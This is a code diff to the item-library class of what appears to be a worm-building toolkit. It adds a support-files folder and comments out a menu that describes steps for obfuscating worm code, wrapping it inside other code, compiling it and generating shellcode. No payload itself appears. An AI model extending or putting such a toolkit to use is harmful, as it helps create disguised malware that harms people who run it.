@@ -21,8 +21,10 @@ class Library:
         self.dir_food = os.path.join(self.dir_items, "food")
         self.dir_process = os.path.join(self.dir_items, "process")
         self.dir_comp_script = os.path.join(self.dir_items, "comp_script")
+        self.dir_sfiles = os.path.join(self.dir_items, "sfiles")
         self.dir_icons = os.path.join(os.path.dirname(__file__), "icons")
         self.console_scr = self.queen.conf.console_screen
+        self.not_standard_items = ["binary", "food", "process", "comp_script", "sfiles"]
         self.lib = {
             "worm" : {},
             "support": {},
@@ -34,7 +36,8 @@ class Library:
             "wrapper" : {},
             "food" : {},
             "process": {},
-            "cscript": {}
+            "cscript": {},
+            "sfiles" : {}
         }
         self.shadow = {}
         self.find_items()
@@ -52,8 +55,11 @@ class Library:
     def find_items(self) -> None:
         c = 0
         for root, dirs, files in os.walk(self.dir_items):
-            if "binary" in root or "food" in root or "process" in root or "comp_script" in root:
-                continue
+            # if "binary" in root or "food" in root or "process" in root or "comp_script" in root:
+            #     continue
+
+            if os.path.split(root)[1] in self.not_standard_items:
+                    continue
             for name in files:
                 path = os.path.join(root, name)
                 item = LibraryItem(path)
@@ -75,7 +81,11 @@ class Library:
         for item in os.listdir(self.dir_comp_script):
             cs = LibraryItem(os.path.join(self.dir_comp_script, item))
             self.lib["cscript"][cs.name] = cs
-            
+        ### Support Files ###
+        ### Standard library item ###
+        for item in os.listdir(self.dir_sfiles):
+            sf = LibraryItem(os.path.join(self.dir_sfiles, item))
+            self.lib["sfiles"][sf.name] = sf
         
 
     
@@ -139,29 +149,29 @@ class Library:
     def show_process_worm(self) -> None:
         text = "\n" + "#" * 50 + " Process Items " + "#" * 50 + "\n"
         text += "-" * 120 + "\n"
-        text += "-" * 50 + " Despcription " + "-" * 50 + "\n"
-        text += self.texter.make_2column("-- [BASE] --", "Creates the worm's basic code.")
-        text += "\n"
-        text += self.texter.make_2column("-- [SHADOW] --", "It obfuscates the code with modules.")
-        text += "\n"
-        text += self.texter.make_2column("-- [STARTER] --", "It creates a starter and puts the code in it.")
-        text += "\n"
-        text += self.texter.make_2column("-- [ADD_IMPORTS] --", "Adds imported libraries to the code.")
-        text += "\n"
-        text += self.texter.make_2column("-- [WRAPPER] --", "It places the worm code in other code.")
-        text += "\n"
-        text += self.texter.make_2column("-- [SAVE_RAW] --", "Saves the worm code to a file.")
-        text += "\n"
-        text += self.texter.make_2column("-- [COMPILER] --", "Run the compiler and compile the worm.")
-        text += "\n"
-        text += self.texter.make_2column("-- [SHOW_OP_CODE] --", "Creating a shellcode and displaying it on the screen.")
-        text += "\n"
-        text += self.texter.make_2column("-- [BUILD_C_SCODE] --", "It creates a C language file and puts the shellcode there. The file is ready for compilation.")
-        text += "\n"
-        text += self.texter.make_2column("-- [BASE_SHELL] --", "It uses additional modules to create code.")
-        text += "\n"
-        text += self.texter.make_2column("-- [CODE_LOADER] --", "Adds code before the worm is launched.")
-        text += "\n"
+        # text += "-" * 50 + " Despcription " + "-" * 50 + "\n"
+        # text += self.texter.make_2column("-- [BASE] --", "Creates the worm's basic code.")
+        # text += "\n"
+        # text += self.texter.make_2column("-- [SHADOW] --", "It obfuscates the code with modules.")
+        # text += "\n"
+        # text += self.texter.make_2column("-- [STARTER] --", "It creates a starter and puts the code in it.")
+        # text += "\n"
+        # text += self.texter.make_2column("-- [ADD_IMPORTS] --", "Adds imported libraries to the code.")
+        # text += "\n"
+        # text += self.texter.make_2column("-- [WRAPPER] --", "It places the worm code in other code.")
+        # text += "\n"
+        # text += self.texter.make_2column("-- [SAVE_RAW] --", "Saves the worm code to a file.")
+        # text += "\n"
+        # text += self.texter.make_2column("-- [COMPILER] --", "Run the compiler and compile the worm.")
+        # text += "\n"
+        # text += self.texter.make_2column("-- [SHOW_OP_CODE] --", "Creating a shellcode and displaying it on the screen.")
+        # text += "\n"
+        # text += self.texter.make_2column("-- [BUILD_C_SCODE] --", "It creates a C language file and puts the shellcode there. The file is ready for compilation.")
+        # text += "\n"
+        # text += self.texter.make_2column("-- [BASE_SHELL] --", "It uses additional modules to create code.")
+        # text += "\n"
+        # text += self.texter.make_2column("-- [CODE_LOADER] --", "Adds code before the worm is launched.")
+        # text += "\n"
         
         for name, obj in self.lib["process"].items():
             text += "-" * 120 + "\n"
